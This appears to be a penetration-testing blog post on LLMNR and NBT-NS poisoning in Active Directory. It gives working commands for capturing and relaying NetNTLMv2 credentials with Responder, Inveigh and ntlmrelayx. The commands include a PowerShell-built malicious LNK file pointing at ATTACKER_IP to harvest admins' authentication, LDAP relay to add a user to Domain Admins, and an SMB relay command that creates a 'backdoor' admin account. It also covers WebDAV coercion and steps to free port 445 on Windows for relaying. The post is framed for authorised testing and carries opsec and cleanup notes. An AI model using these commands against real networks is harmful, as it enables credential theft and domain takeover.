---
title: "Active Directory Penetration Testing: LLMNR & NBT-NS Poisoning — Stealing Credentials from the Network"
date: 2026-08-12
categories: [Active Directory, Credential Attacks]
tags: [llmnr, nbt-ns, responder, ntlmrelayx, relay, poisoning, credentials, active-directory]
---

## Introduction

In the previous post — [Active Directory Penetration Testing: How It All Starts](https://3x0t1k.github.io/posts/initial-enumeration-active-directory/#introduction) — I briefly showed how Responder fits into the picture when you're stuck in a network segment with nothing useful to work with. We captured a NetNTLMv2 challenge-response, cracked it with hashcat, and got a valid credential.

But what if the hash doesn't crack? And more importantly — why does any of this work in the first place?

In this post I want to go deeper. We'll cover what LLMNR and NBT-NS actually are, why they exist, and why they're inherently exploitable. Then we'll get into relay attacks — because when cracking fails, the next question is whether the captured challenge-response can be relayed. I'll also walk through a real-world chain from my own experience.

---

## What Are LLMNR and NBT-NS?

To understand why this attack works, you need to understand what problem these protocols were designed to solve.

When a Windows machine tries to resolve a hostname — for example when a user accesses `\\FILESERVER\share` — Windows goes through a resolution process that, in simplified terms, looks like this:

```
1. Local hosts file
2. DNS query to the configured DNS server
3. LLMNR multicast (if DNS fails)
4. NBT-NS broadcast (if LLMNR fails)
```

The actual resolution logic varies depending on the hostname type, DNS client configuration, and other factors — but for the purposes of understanding this attack, this simplified model is what matters.

### LLMNR

**Link-Local Multicast Name Resolution** was introduced in Windows Vista as a fallback when DNS fails. It sends a **multicast** query to `224.0.0.252` on UDP port 5355 — every machine on the local network segment receives it.

### NBT-NS

**NetBIOS Name Service** is the older predecessor — legacy name resolution over UDP port 137. Unlike LLMNR, NBT-NS uses **broadcast** rather than multicast. Still present in modern Windows environments for backwards compatibility.

### Why This Is Exploitable

Both protocols share the same fundamental flaw — they were designed for convenience on small trusted networks, not for security. Neither provides a mechanism for the querying machine to verify that a response is legitimate. An attacker on the same segment can answer the query before the real host does — or instead of it — and the querying machine has no reliable way to tell the difference.

This means that anyone sitting on the same network segment can observe these multicast/broadcast name-resolution queries, respond to them, and redirect the authentication attempt to themselves. The querying machine will then try to authenticate — sending a NetNTLMv2 challenge-response in the process.

That challenge-response is what we're after.

---

## How It Works in Practice

For steps 3 and 4 to trigger, the hostname must be unknown to both the local hosts file and DNS. If DNS resolves the name successfully — the broadcast never happens and we catch nothing.

This is why the attack most commonly fires on mistakes. A classic example: an employee tries to access a file server but makes a typo — `\\FILESERVR\backups` instead of `\\FILESERVER\backups`. DNS has no record of `FILESERVR`. The local hosts file doesn't know it either. Windows falls back to LLMNR and broadcasts to the network segment:

```
"Does anyone know who FILESERVR is?"
```

Responder, listening on the segment, answers immediately:

```
"Yes, that's me. Connect here."
```

The employee's machine trusts the response and attempts to authenticate — sending an NTLMv2 response in the process. We capture it. The employee sees a failed connection or an access denied error and probably tries again with the correct name. They never know what happened.

> **Terminology note:** You'll often see this referred to as an "NTLMv2 hash" — including in tool output. Technically it's a **NetNTLMv2 challenge-response**, not a hash in the traditional sense. It can't be used for pass-the-hash, but it can be cracked offline or relayed. The distinction matters when you're deciding what to do with it.

```
[SMB] NTLMv2-SSP Hash : r.nilson::CORP:a3f8c2d1e9b8...
```

This can occur regularly in real environments. Mistyped hostnames, stale shortcuts pointing to renamed servers, scripts referencing old machine names, scheduled tasks connecting to decommissioned hosts — all of these generate LLMNR and NBT-NS queries. All of them are opportunities.

---

## Taking It Further — The LNK File Trick

Let's say we caught r.nilson through exactly that scenario — a mistyped file server name. We crack the hash, authenticate, and start enumerating. Turns out Rick is a Level 1 helpdesk technician. Not very exciting on its own.

But during share enumeration we notice something useful: Rick has **write access** to an IT department share on the same file server. That share is likely browsed regularly by IT staff — sysadmins, higher-privileged accounts.

We can use this to capture hashes from whoever opens that folder — without any interaction from the victim beyond simply navigating to the directory.

### How It Works

We craft a malicious `.lnk` (Windows shortcut) file whose **icon path** points to our Responder listener instead of a local resource:

```
Icon location: \\ATTACKER_IP\share\icon.ico
```

When a user opens the folder containing this file, Windows Explorer may automatically try to load the icon — reaching out to our IP over SMB to fetch `icon.ico`. That outbound SMB connection triggers NTLM authentication and we capture the response. In many configurations no clicks are required — simply opening the folder is enough. That said, the exact behaviour depends on the Windows version, Explorer settings, and any hardening in place.

We drop the file onto the IT share. One way to generate the malicious LNK directly on a Windows host you already have access to:

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\Users\Public\Documents\readme.lnk")
$lnk.TargetPath = "\\ATTACKER_IP\share\pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "\\ATTACKER_IP\share\icon.ico"
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

Then upload it to the writable share:

```bash
nxc smb 192.168.1.30 -u r.nilson -p 'Winter2025!' --put-file readme.lnk '\IT\Documents\readme.lnk'
```

Responder is already listening. We wait.

When an admin opens the share — their machine automatically authenticates to us. We capture the NetNTLMv2 challenge-response.

```
[SMB] NTLMv2-SSP Hash : t.morgan::CORP:f4e3d2c1b0a9...
```

### What This Gives Us

If the captured hash belongs to another user at the same privilege level — that's **lateral movement**. We can now operate as a different account, potentially with access to different systems or data.

If the hash belongs to a higher-privileged account — a sysadmin, a Domain Admin, a service account — that's **privilege escalation**. One write permission on a shared folder turned into domain-level access.

> This technique does not require code execution or a user to explicitly launch the shortcut — but it is not inherently stealthy. Outbound SMB authentication to an unknown host, changes to share contents, and the resulting network activity are all potentially detectable.

---

## When the Hash Doesn't Crack — Relay Attacks

Let's say we caught `t.morgan` — and BloodHound shows he's a member of Domain Admins. The hash won't crack. Strong password, rockyou comes back empty.

We don't need the plaintext. We can relay the authentication directly — but which protocol and target we relay to depends on what protections are in place.

### Setup

Turn off SMB and HTTP in Responder so it only poisons but doesn't consume the authentication:

```bash
# /etc/responder/Responder.conf
SMB = Off
HTTP = Off
```

Start Responder in poisoning-only mode:

```bash
responder -I eth0 -wf
```

### Option 1 — LDAP Relay → Add User to Domain Admins

If we want to relay to LDAP — first check whether LDAP signing and channel binding are enforced on the DC. These are separate mechanisms: LDAP signing protects traffic integrity, channel binding ties authentication to the TLS session. Both affect whether LDAP relay is viable:

```bash
nxc ldap 192.168.1.10 -u '' -p '' -M ldap-checker
```

### Option 1 — LDAP Relay → Add User to Domain Admins

**Prerequisites:**
- LDAP signing not enforced on DC
- LDAP channel binding not enforced on DC
- Relayed account has sufficient rights to modify group membership (e.g. Domain Admin)

Check:

```bash
nxc ldap 192.168.1.10 -u '' -p '' -M ldap-checker
```

If neither is enforced — we relay the DA's authentication to the DC over LDAP and use it to add a controlled account to the Domain Admins group:

```bash
impacket-ntlmrelayx -t ldap://192.168.1.10 -smb2support --escalate-user r.nilson
```

> **Note:** `--escalate-user` works because we're relaying `t.morgan` who is a Domain Admin — meaning he has the rights to modify Domain Admins group membership via LDAP. If you relay a lower-privileged account this flag won't produce results. The privilege of the relayed account is what matters here.

When `t.morgan`'s authentication hits ntlmrelayx — it gets relayed to the DC and used to grant `r.nilson` Domain Admin privileges. We already have r.nilson's credentials. Now r.nilson is Domain Admin.

Verify:

```bash
nxc smb 192.168.1.10 -u r.nilson -p 'Winter2025!' --groups
```

### Option 2 — SMB Relay → Shell via psexec

**Prerequisites:**
- SMB signing not required on the target machine
- Relayed account is a local admin on the target machine
- Target is different from the machine the authentication came from (can't relay back to same host)

Check which targets don't require SMB signing:

```bash
nxc smb 192.168.1.0/24 --gen-relay-list targets.txt
```

Then relay:

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support -i
```

`-i` opens an interactive SMB shell locally. Or execute a command directly:

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support -c "net user backdoor P@ssw0rd123! /add && net localgroup 'Domain Admins' backdoor /add"
```

This works but can generate noisy log events — depending on what you execute after the relay, you may see Event ID 4624 (logon) and, for any process execution, Event ID 4688 (process creation). In monitored environments this will likely trigger alerts. Use it when stealth isn't a priority.

### Option 3 — Shadow Credentials (Advanced)

**Prerequisites:**
- LDAP signing not enforced on DC
- LDAP channel binding not enforced on DC
- Relayed account has write access to `msDS-KeyCredentialLink` attribute on the target account
- Target environment supports PKINIT (requires a CA or ADCS)

If you want a lower-noise approach — no new users, no group membership changes — Shadow Credentials is worth knowing about. Through LDAP relay you add a `msDS-KeyCredentialLink` attribute to the target account, then authenticate as that user via PKINIT certificate-based auth without ever knowing their password. It's not footprint-free — modifying AD object attributes is a detectable operation — but it avoids the more obvious indicators of new accounts or group changes.

This is a deeper topic covered in a dedicated post — but worth knowing it exists.

### ADCS — If Certificate Services Are Present

**Prerequisites:**
- AD CS deployed in the environment
- HTTP enrollment endpoint present and accepting NTLM authentication
- EPA (Extended Protection for Authentication) not enforced on the enrollment endpoint
- Relayed account has enrollment rights

If the environment has Active Directory Certificate Services (AD CS) deployed with a vulnerable HTTP enrollment endpoint that accepts relayable authentication, the attack surface expands significantly. This configuration opens up ESC8 — allowing you to relay a DA's authentication to the CA's HTTP enrollment endpoint and obtain a certificate on their behalf, usable for persistent authentication even after a password change. AD CS attacks require specific conditions to be met and are covered in a dedicated post.

---

## Poisoning from Windows — Inveigh

Everything above assumes you're running from a Linux host. But what if your foothold is a Windows machine?

Port 445 on Windows is always in use — the SMB service owns it and you can't bind Responder to it without killing the service first. This is where **Inveigh** comes in — a PowerShell/C# tool that does the same job as Responder but is built for Windows.

### Option A — PowerShell version (older, still works)

```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

### Option B — InveighZero (C#, more modern)

```powershell
.\Inveigh.exe
```

Both versions listen for LLMNR and NBT-NS queries and capture NetNTLMv2 challenge-responses just like Responder.

### WebDAV — An Alternative When SMB Is Blocked

In some environments SMB outbound traffic is blocked at the network level — firewalls, segmentation, or host-based rules prevent port 445 from reaching your machine. WebDAV is a useful alternative in these cases.

WebDAV triggers HTTP-based authentication instead of SMB. The authentication still produces a NetNTLMv2 challenge-response — but it travels over port 80 or 443. This can be useful in environments where outbound SMB is restricted but the required HTTP-based authentication path remains available.

If the WebClient service is running on a target machine, you can coerce authentication via WebDAV path:

```bash
# Check if WebClient service is running on targets
nxc smb 192.168.1.0/24 -u r.nilson -p 'Winter2025!' -M webdav
```

If WebClient is active, authentication attempts to `\\ATTACKER_IP@80\share` will go over HTTP — straight into ntlmrelayx. This technique is often combined with coercion tools and is particularly useful in environments where SMB relay is blocked but HTTP is wide open.

### The Port 445 Problem on Windows — Full Relay Setup

If you want to do full relay attacks from a Windows host — not just capture but relay — you need port 445 free. The correct sequence matters:

**Step 1 — Save the current startup type** before changing anything, so you can restore it exactly:

```powershell
sc.exe qc lanmanserver
# Note the START_TYPE value before proceeding
```

**Step 2 — Disable lanmanserver auto-restart:**

```powershell
sc.exe config lanmanserver start= disabled
```

**Step 3 — Stop the services.** On the Windows builds I tested, the following sequence freed port 445. Service dependencies can differ between Windows versions — verify the state with `sc query` or `Get-Service` rather than assuming this exact order applies everywhere:

```powershell
sc.exe stop lanmanserver
sc.exe stop srv2
sc.exe stop srvnet
```

Verify port 445 is no longer bound:

```powershell
netstat -ano | findstr :445
```

**Step 3 — Set up a reverse port forward** to redirect inbound port 445 traffic to your relay tool (e.g. ntlmrelayx listening locally on 7445):

```powershell
netsh interface portproxy add v4tov4 listenport=445 listenaddress=0.0.0.0 connectport=7445 connectaddress=127.0.0.1
```

**Step 4 — Add a firewall rule** to allow inbound traffic on 445 (often blocked by default on workstations):

```powershell
New-NetFirewallRule -DisplayName "File Sharing" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 445
```

**Step 5 — Start ntlmrelayx** on port 7445 and wait for authentication events.

### Cleanup — Restore in Reverse Order

When done, restore everything:

```powershell
# Restore lanmanserver startup type to what it was originally (check the value you saved earlier)
sc.exe config lanmanserver start= auto  # replace 'auto' with the original value if different

# Start services in reverse order
sc.exe start srvnet
sc.exe start srv2
sc.exe start lanmanserver

# Remove firewall rule
Remove-NetFirewallRule -DisplayName "File Sharing"

# Remove port proxy if used
netsh interface portproxy delete v4tov4 listenport=445 listenaddress=0.0.0.0
```

> This is a significant operational action — stopping LanmanServer kills all SMB-dependent services on that machine. Always confirm scope and restore immediately after. Document every step.

---

## Modern Windows — A Word of Caution

Everything above describes techniques that work well in environments running older or default configurations. In 2026 it's important to acknowledge that the landscape has shifted.

**SMB signing** has been progressively tightened by Microsoft. Starting with Windows 11 24H2 and Windows Server 2025, Microsoft significantly tightened the default SMB signing requirements — though the exact defaults depend on the Windows edition and whether we're talking about the SMB client or server side. This means classic SMB relay is blocked where the relevant client and server both enforce signing — but viability still depends on the specific pair of machines involved, not simply whether the OS is "modern".

**NTLM restrictions** are also tightening. Microsoft has been incrementally moving toward restricting NTLM usage across the board, with Server 2025 introducing additional controls.

**What this means in practice:**

- In legacy or mixed environments — these techniques work as described
- In modern fully-patched environments — check SMB signing status before planning a relay attack
- LDAP relay viability still depends on LDAP signing and channel binding configuration regardless of Windows version

```bash
# Generate a list of potential SMB relay targets
nxc smb 192.168.1.0/24 --gen-relay-list targets.txt
```

This produces a list of hosts that NetExec considers suitable as SMB relay targets based on the observed SMB signing requirements. If the list comes back empty — signing is enforced across the board and you need to pivot to LDAP relay or other vectors.

The core concepts in this post remain valid — the attack surface has narrowed in modern environments, not disappeared.

---

## Opsec

Responder and Inveigh are effective but not invisible. A few things to keep in mind on real engagements:

**You show up in network logs.** Every machine that receives a poisoned response will have a record of connecting to your IP. In a monitored environment a sudden spike of SMB connections to an unknown host is suspicious.

**Responder's behavior is a known signature.** Security products — EDR, NDR, IDS — have specific detection rules for Responder. The multicast responses it sends, the timing, the fingerprint of the tool are all detectable. If the client has mature monitoring, consider more targeted approaches like coercion instead of broad poisoning.

**Running time matters.** The longer Responder runs, the more events accumulate in logs. In a red team engagement with strict opsec requirements, run it in short controlled windows rather than leaving it running all day.

**Always confirm scope.** Poisoning can disrupt legitimate name resolution on the segment. If a script or scheduled task is relying on LLMNR fallback for a legitimate host — you'll break it. Discuss this with the client before running Responder in production.
